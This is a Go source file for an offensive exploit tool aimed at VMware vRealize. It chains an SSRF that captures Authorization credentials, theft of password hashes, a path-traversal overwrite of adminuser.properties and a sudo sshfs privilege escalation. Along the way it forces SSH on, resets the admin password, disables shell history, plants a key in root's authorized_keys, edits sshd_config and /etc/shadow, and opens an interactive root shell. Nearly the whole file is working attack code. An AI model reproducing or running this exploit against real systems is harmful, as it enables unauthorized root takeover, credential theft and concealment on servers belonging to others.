package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"mime/multipart"
	"net"
	"net/http"
	"net/textproto"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
	"golang.org/x/crypto/ssh"
)

var remoteAddr, localAddr string
var remotePort, localPort int
var credentials string
var vulnerable bool
var exploit bool
var verbose bool
var restore bool

func getOutboundIP(remoteAddr string) string {

	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", remoteAddr, remotePort))
	if err != nil {
		log.Fatal("[-] ", err)
	}

	localAddr := conn.LocalAddr().(*net.TCPAddr)

	err = conn.Close()
	if err != nil {
		log.Fatal("[-] ", err)
	}

	return localAddr.IP.String()

}

func ssrfHandler(w http.ResponseWriter, req *http.Request) {

	if verbose {
		fmt.Printf("[*] SSRF Listener Received Request\nremoteAddr=%s\n", req.RemoteAddr)
	}
	credentials = req.Header.Get("Authorization")
	vulnerable = true

}

func randomString() string {

	rand.Seed(time.Now().UnixNano())
	chars := []byte("ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
		"abcdefghijklmnopqrstuvwxyz" +
		"0123456789")
	length := 16
	var builder strings.Builder
	for i := 0; i < length; i++ {
		err := builder.WriteByte(chars[rand.Intn(len(chars))])
		if err != nil {
			log.Fatal("[-] ", err)
		}
	}
	return builder.String()

}

func requestConfirmation(msg string) bool {

	fmt.Printf(msg)

	var response string
	_, err := fmt.Scanln(&response)
	if err != nil {
		if err.Error() != "unexpected newline" {
			log.Fatal(err)
		}
	}

	if response == "y" || response == "Y" {
		return true
	} else if response == "n" || response == "N" {
		return false
	} else {
		return requestConfirmation(msg)
	}

}

// http://networkbit.ch/golang-ssh-client/
func executeSSHCommands(config *ssh.ClientConfig, commands []string) string {

	conn, err := ssh.Dial("tcp", fmt.Sprintf("%s:22", remoteAddr), config)
	if err != nil {
		log.Fatal("[-] ", err)
	}
	defer conn.Close()

	sess, err := conn.NewSession()
	if err != nil {
		log.Fatal("[-] ", err)
	}
	defer sess.Close()

	stdin, err := sess.StdinPipe()
	if err != nil {
		log.Fatal("[-] ", err)
	}

	var b bytes.Buffer
	sess.Stdout = &b
	sess.Stderr = os.Stderr

	err = sess.Shell()
	if err != nil {
		log.Fatal("[-] ", err)
	}

	for _, cmd := range commands {
		_, err = fmt.Fprintf(stdin, "%s\n", cmd)
		if err != nil {
			log.Fatal("[-] ", err)
		}
	}

	err = sess.Wait()
	if err != nil {
		log.Fatal("[-] ", err)
	}

	return b.String()

}

// https://gist.github.com/atotto/ba19155295d95c8d75881e145c751372
func interactiveSSHSession(config *ssh.ClientConfig, ctx context.Context) error {

	conn, err := ssh.Dial("tcp", fmt.Sprintf("%s:22", remoteAddr), config)
	if err != nil {
		log.Fatal("[-] ", err)
	}
	defer conn.Close()


	sess, err := conn.NewSession()
	if err != nil {
		log.Fatal("[-] ", err)
	}
	defer sess.Close()

	go func() {
		<-ctx.Done()
		err = conn.Close()
		if err != nil {
			log.Fatal("[-] ", err)
		}
	}()

	modes := ssh.TerminalModes{
		ssh.ECHO:          0,
		ssh.TTY_OP_ISPEED: 14400,
		ssh.TTY_OP_OSPEED: 14400,
	}

	term := os.Getenv("TERM")
	if term == "" {
		term = "xterm-256color"
	}

	err = sess.RequestPty(term, 40, 80, modes)
	if err != nil {
		log.Fatal("[-] ", err)
	}

	sess.Stdout = os.Stdout
	sess.Stderr = os.Stderr
	sess.Stdin = os.Stdin

	err = sess.Shell()
	if err != nil {
		log.Fatal("[-] ", err)
	}

	err = sess.Wait()
	if err != nil {
		if e, ok := err.(*ssh.ExitError); ok {
			switch e.ExitStatus() {
			case 130:
				return nil
			}
		}
		log.Fatal("[-] ", err)
	}
	return nil

}

func main() {

	art := `
▄▄▄ ▄▄▄ .▄▄▄·▄▄▌ ▪▄▄▄▄▄▄· ▄▌    .▄▄ ·• ▌ ▄ ·. ▄▄▄·.▄▄ · ▄ .▄▄▄ ▄▄▄  
▀▄ █▀▄.▀▐█ ▀███• █•██ ▐█▪██▌    ▐█ ▀.·██ ▐███▐█ ▀█▐█ ▀.██▪▐▀▄.▀▀▄ █·
▐▀▀▄▐▀▀▪▄█▀▀███▪ ▐█▐█.▐█▌▐█▪    ▄▀▀▀█▐█ ▌▐▌▐█▄█▀▀█▄▀▀▀███▀▐▐▀▀▪▐▀▀▄ 
▐█•█▐█▄▄▐█ ▪▐▐█▌▐▐█▐█▌·▐█▀·.    ▐█▄▪▐██ ██▌▐█▐█ ▪▐▐█▄▪▐██▌▐▐█▄▄▐█•█▌
.▀  ▀▀▀▀ ▀  ▀.▀▀▀▀▀▀▀▀  ▀ •      ▀▀▀▀▀▀  █▪▀▀▀▀  ▀ ▀▀▀▀▀▀▀ ·▀▀▀.▀  ▀
`

	fmt.Println(art)
	fmt.Printf("### REALITY_SMASHER // vRealize RCE + Privesc (CVE-2021-21975, CVE-2021-21983, CVE-0DAY-?????) ###\n\n")

	log.SetFlags(0)

	flag.StringVar(&remoteAddr, "r", "", "Remote Address (required) // This is your target. This is the only required option.")
	flag.IntVar(&remotePort, "rp", 443, "Remote Port // This may be useful if vRealize is only accessible on a port other than \"443\".")
	flag.StringVar(&localAddr, "l", "", "Local Address // This option may be useful if you wish to listen on a different interface.") // ?
	flag.IntVar(&localPort, "lp", 0, "Local Port // This determines the port on which to host the SSRF listener. Useful for bypassing firewalls.") // ?
	flag.StringVar(&credentials, "b", "", "Basic Auth String // e.g. \"Basic YWRtaW46YWRtaW4=\". This may be useful if you don't have SSRF but have credentials and want a root SSH shell.")
	flag.BoolVar(&exploit, "x", false, "Exploit // This is disabled by default, limiting functionality to a vulnerability check.")
	flag.BoolVar(&verbose, "v", false, "Verbose // Print statements.")

	flag.Usage = func () { fmt.Printf("Usage: \"%s\" -r REMOTE_ADDRESS\n\n" +
		"\t-r\t\t%s\n\n" +
		"\t-rp\t\t%s\n\n" +
		"\t-l\t\t%s\n\n" +
		"\t-lp\t\t%s\n\n" +
		"\t-b\t\t%s\n\n" +
		"\t-x\t\t%s\n\n" +
		"\t-v\t\t%s\n\n" +
		"\nAuthor: rabidwh0re\n",
		os.Args[0],
		flag.Lookup("r").Usage,
		flag.Lookup("rp").Usage,
		flag.Lookup("l").Usage,
		flag.Lookup("lp").Usage,
		flag.Lookup("b").Usage,
		flag.Lookup("x").Usage,
		flag.Lookup("v").Usage)
	}

	flag.Parse()

	if remoteAddr == "" {
		log.Fatal("[-] Remote Address must be set!")
	}

	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	if verbose {
		fmt.Println("[*] Fetching Outbound Address ...")
	}

	if localAddr == "" {
		localAddr = getOutboundIP(remoteAddr)
	}
	if verbose {
		fmt.Printf("localAddr=%s\n", localAddr)
	}

	listener, err := net.Listen("tcp", fmt.Sprintf("%s:%d", localAddr, localPort))
	if err != nil {
		log.Fatal("[-] ", err)
	}
	localPort = listener.Addr().(*net.TCPAddr).Port

	var url, data string
	var req *http.Request
	var client = &http.Client{}
	var server = &http.Server{}

	if credentials == "" {

		if verbose {
			fmt.Printf("[*] Starting SSRF Listener (%s:%d)\n", localAddr, localPort)
		}

		go func() {
			http.HandleFunc("/", ssrfHandler)
			err = server.ServeTLS(listener,"server.crt", "server.key")
			if err != nil {
				if err.Error() != "http: Server closed" {
					log.Fatal("[-] ", err)
				}
			}
		}()

		if verbose {
			fmt.Println("[*] Triggering SSRF Request (CVE-2021-21975) ...")
		}

		url = fmt.Sprintf("https://%s:%d/casa/nodes/thumbprints", remoteAddr, remotePort)
		data = fmt.Sprintf("[\"%s:%d\"]", localAddr, localPort)

		req, err = http.NewRequest(http.MethodPost, url, strings.NewReader(data))
		if err != nil {
			log.Fatal("[-] ", err)
		}
		req.Header.Set("Host", remoteAddr)
		req.Header.Set("Content-Type", "application/json; charset=UTF-8")
		req.Header.Set("Connection", "close")

		_, err = client.Do(req)
		if err != nil {
			log.Fatal("[-] ", err)
		}

		for i := 0; i < 5 && !vulnerable; i++ {
			time.Sleep(2000)
		}

		err = server.Shutdown(context.Background())
		if err != nil {
			log.Fatal("[-] ", err)
		}

		if !vulnerable {
			log.Fatal("[-] Target does not appear to be vulnerable!")
		}

		if verbose {
			fmt.Println("[*] Checking SSRF Request for Authorization Credential Leak ...")
		}
		if credentials == "" {
			log.Fatal("[-] No Authorization Credentials Found!")
		}

	}

	if verbose {
		fmt.Printf("Authorization: %s\n", credentials)
	}

	if verbose {
		fmt.Println("[*] Sending Password Synchronization Request ...")
	}

	url = fmt.Sprintf("https://%s:%d/casa/cluster/security/private/passwordsync", remoteAddr, remotePort)

	req, err = http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		log.Fatal("[-] ", err)
	}
	req.Header.Set("Host", remoteAddr)
	req.Header.Set("Authorization", fmt.Sprintf("%s", credentials))
	req.Header.Set("Content-Type", "application/json; charset=UTF-8")
	req.Header.Set("Connection", "close")

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal("[-] ", err)
	}
	b, err := ioutil.ReadAll(resp.Body)

	if resp.StatusCode != 200 {
		log.Fatal("[-] ", resp.Status, string(b))
	}
	if verbose {
		fmt.Println(resp.Status)
	}

	var PasswordSyncData map[string]interface{}
	err = json.Unmarshal(b, &PasswordSyncData)
	if err != nil {
		log.Fatal("[-] ", err)
	}

	if verbose {
		fmt.Println("[*] Extracting Hashed Passwords ...")
	}

	var username = "admin"
	var osHashedPassword, adminHashedPassword string
	var ok bool

	if PasswordSyncData["os_user_data"] != nil {
		username, ok = PasswordSyncData["os_user_data"].(map[string]interface{})["username"].(string)
		if !ok {
			if verbose {
				fmt.Println("[-] Failed to Extract Username!")
			}
		}
	}

	if PasswordSyncData["os_user_data"] != nil {
		osHashedPassword, ok = PasswordSyncData["os_user_data"].(map[string]interface{})["hashed_password"].(string)
		if !ok {
			if verbose {
				fmt.Println("[-] Failed to Extract OS Hashed Password!")
			}
		}
	}

	if PasswordSyncData["admin_user_data"] != nil {
		adminHashedPassword, ok = PasswordSyncData["admin_user_data"].(map[string]interface{})["hashed_password"].(string)
		if !ok {
			if verbose {
				fmt.Println("[-] Failed to Extract Admin Hashed Password!")
			}
		}
	}

	if verbose {
		fmt.Printf("username: %s\nosHashedPassword: %s\nadminHashedPassword: %s\n", username, osHashedPassword, adminHashedPassword)
	}

	if !exploit && vulnerable {
		log.Fatalf("[!] VULNERABLE TARGET -> %s:%d\n\nRun \"%s\" with the \"-x\" flag to launch exploit.\n", remoteAddr, remotePort, os.Args[0])
	}

	if username == "" || osHashedPassword  == "" || adminHashedPassword  == "" {
		response := requestConfirmation("Would you like to continue without hash restoration? (Y/N): ")
		if !response {
			log.Fatal("[-] Abort! ")
		}
		restore = false
	}

	if verbose {
		fmt.Printf("username: %s\nosHashedPassword: %s\nadminHashedPassword: %s\n", username, osHashedPassword, adminHashedPassword)
	}

	var isSSHEnabled bool

	for i := 0; i < 3 && !isSSHEnabled; i++  {
		if verbose {
			fmt.Printf("[*] Sending SSH Enable Request ...\n")
		}

		url = fmt.Sprintf("https://%s:%d/casa/ssh/enable", remoteAddr, remotePort)

		req, err = http.NewRequest(http.MethodPost, url, nil)
		if err != nil {
			if verbose {
				log.Println("[-] ", err)
			}
		}

		req.Header.Set("Host", remoteAddr)
		req.Header.Set("Authorization", fmt.Sprintf("%s", credentials))
		req.Header.Set("Content-Type", "application/json; charset=UTF-8")
		req.Header.Set("Connection", "close")

		resp, err = client.Do(req)
		if err != nil {
			if verbose {
				log.Println("[-] ", err)
			}
		}
		b, err = ioutil.ReadAll(resp.Body)

		if resp.StatusCode != 200 {
			if verbose {
				log.Println("[-] ", resp.Status, string(b))
			}
		}

		var SshEnableDisableVO map[string]bool
		err = json.Unmarshal(b, &SshEnableDisableVO)
		if err != nil {
			if verbose {
				log.Println("[-] ", err)
			}
		}

		isSSHEnabled, ok = SshEnableDisableVO["is_ssh_enabled"]
		if !ok || !isSSHEnabled {
			if verbose {
				log.Printf("[-] Failed to Enabled SSH! Retrying ...")
			}
			time.Sleep(3000)
			continue
		}
		if verbose {
			fmt.Println(string(b))
		}
	}

	if !isSSHEnabled {
		log.Fatal("[-] Failed to Enabled SSH!")
	}

	if verbose {
		fmt.Println("[*] Triggering Credential Overwrite (CVE-2021-21983?) ...")
	}

	url = fmt.Sprintf("https://%s:%d/casa/private/config/slice/ha/certificate?name=../../../../vcops/user/conf/adminuser.properties", remoteAddr, remotePort)

	multipartFormData := new(bytes.Buffer)
	writer := multipart.NewWriter(multipartFormData)
	mediaHeader := textproto.MIMEHeader{}
	mediaHeader.Set("Content-Disposition", "form-data; name=\"file\"; filename=\"adminuser.properties\"")
	mediaHeader.Set("Content-Type", "application/octet-stream")
	_, err = writer.CreatePart(mediaHeader)
	if err != nil {
		log.Fatal("[-] ", err)
	}

	err = writer.Close()
	if err != nil {
		log.Fatal("[-] ", err)
	}

	req, err = http.NewRequest(http.MethodPost, url, multipartFormData)
	if err != nil {
		log.Fatal("[-] ", err)
	}
	req.Header.Set("Host", remoteAddr)
	req.Header.Set("Authorization", fmt.Sprintf("%s", credentials))
	req.Header.Set("Content-Type", fmt.Sprintf( "multipart/form-data; boundary=%s", writer.Boundary()))
	req.Header.Set("Connection", "close")

	resp, err = client.Do(req)
	if err != nil {
		log.Fatal("[-] ", err)
	}
	b, err = ioutil.ReadAll(resp.Body)

	if resp.StatusCode != 200 {
		log.Fatal("[-] ", resp.Status, string(b))
	}

	if verbose {
		fmt.Println(resp.Status)
	}

	if verbose {
		fmt.Println("[*] Generating New Password ...")
	}
	password := fmt.Sprintf("Aa1@%s", randomString())
	if verbose {
		fmt.Printf("%s\n", password)
	}

	if verbose {
		fmt.Println("[*] Sending Admin Password Initialization Request ...")
	}

	url = fmt.Sprintf("https://%s:%d/casa/security/adminpassword/initial", remoteAddr, remotePort)
	data = fmt.Sprintf("{\"password\":\"%s\"}", password)

	req, err = http.NewRequest(http.MethodPut, url, strings.NewReader(data))
	if err != nil {
		log.Fatal("[-] ", err)
	}
	req.Header.Set("Host", remoteAddr)
	req.Header.Set("Authorization", fmt.Sprintf("%s", credentials))
	req.Header.Set("Content-Type", "application/json; charset=UTF-8")
	req.Header.Set("Connection", "close")

	resp, err = client.Do(req)
	if err != nil {
		log.Fatal("[-] ", err)
	}
	if resp.StatusCode != 200 {
		b, err = ioutil.ReadAll(resp.Body)
		log.Fatal("[-] ", string(b))
	}
	if verbose {
		fmt.Println(resp.Status)
	}

	if verbose {
		fmt.Printf("[*] Validating SSH Access (%s@%s) ...\n", username, remoteAddr)
	}

	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	result := executeSSHCommands(config, []string{
		"set +o history",
		"uname -a",
		"id",
		"exit",
	})
	if verbose {
		fmt.Println(result)
	}

	if verbose {
		fmt.Printf("[*] Provisioning SSH Key Pair (%s@%s) ...\n", username, remoteAddr)
	}

	result = executeSSHCommands(config, []string{
		"set +o history",
		"HOSTNAME=`hostname` stat $HOME/.ssh/id_rsa >/dev/null 2>&1 && cat $HOME/.ssh/id_rsa || (ssh-keygen -t rsa -C \"$HOSTNAME\" -f \"$HOME/.ssh/id_rsa\" -P \"\" 1>/dev/null && cat \"$HOME/.ssh/id_rsa\")",
		"exit",
	})
	privateKey := result
	if verbose {
		fmt.Println(privateKey)
	}

	if verbose {
		fmt.Printf("[*] Triggering Root Privilege Escalation (%s@%s) (CVE-0DAY-?????) ...\n", username, remoteAddr)
	}

	executeSSHCommands(config, []string{
		"set +o history",
		"echo 'grep -q -f /home/admin/.ssh/id_rsa.pub /root/.ssh/authorized_keys || cat /home/admin/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys' > /home/admin/privesc.sh",
		"echo 'sed -i \"s/PermitRootLogin no/PermitRootLogin yes/\" /etc/ssh/sshd_config' >> /home/admin/privesc.sh",
		"echo 'timeout 10s bash -c \"until service sshd restart; do sleep 1; done;\"' >> /home/admin/privesc.sh",
		"sudo /usr/bin/sshfs -o allow_other -o password_stdin -o StrictHostKeyChecking\\=no -o UserKnownHostsFile\\=/dev/null admin@localhost:/ /tmp/ -o ssh_command\\='bash /home/admin/privesc.sh #' 2>/dev/null <<< X",
		"rm /home/admin/privesc.sh",
		"exit",
	})

	if verbose {
		fmt.Printf("[*] Validating Privileged SSH Access (root@%s) ...\n", remoteAddr)
	}

	signer, err := ssh.ParsePrivateKey([]byte(privateKey))
	if err != nil {
		log.Fatal("[-] ", resp.Status)
	}

	config = &ssh.ClientConfig{
		User: "root",
		Auth: []ssh.AuthMethod{
			ssh.PublicKeys(signer),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout: time.Minute,
	}

	result = executeSSHCommands(config, []string{
		"set +o history",
		"id",
		"exit",
	})
	if verbose {
		fmt.Println(result)
	}

	if restore {
		if verbose {
			fmt.Printf("[*] Restoring Hashed Passwords (root@%s) ...\n", remoteAddr)
		}

		sanitizedAdminHashedPassword := strings.Replace(adminHashedPassword, "/", "\\/", -1)
		sanitizedAdminHashedPassword = strings.Replace(sanitizedAdminHashedPassword, "=", "\\\\=", -1)

		sanitizedOSHashedPassword := strings.Replace(osHashedPassword, "/", "\\/", -1)

		executeSSHCommands(config, []string{
			"set +o history",
			fmt.Sprintf("sed -i 's/hashed_password=.*/hashed_password=%s/' /storage/vcops/user/conf/adminuser.properties", sanitizedAdminHashedPassword),
			fmt.Sprintf("sed -i 's/admin:[^:]*/admin:%s/' /etc/shadow", sanitizedOSHashedPassword),
			"exit",
		})
	}

	if verbose {
		fmt.Printf("[*] Initiating Interactive SSH Session (root@%s) ...\n", remoteAddr)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, syscall.SIGTERM, syscall.SIGINT)
	ctx, cancel := context.WithCancel(context.Background())

	go func() {
		err = interactiveSSHSession(config, ctx)
		if err != nil {
			log.Fatal("[-] ", err)
		}
		cancel()
	}()

	select {
		case <-sig:
			cancel()
		case <-ctx.Done():
	}

}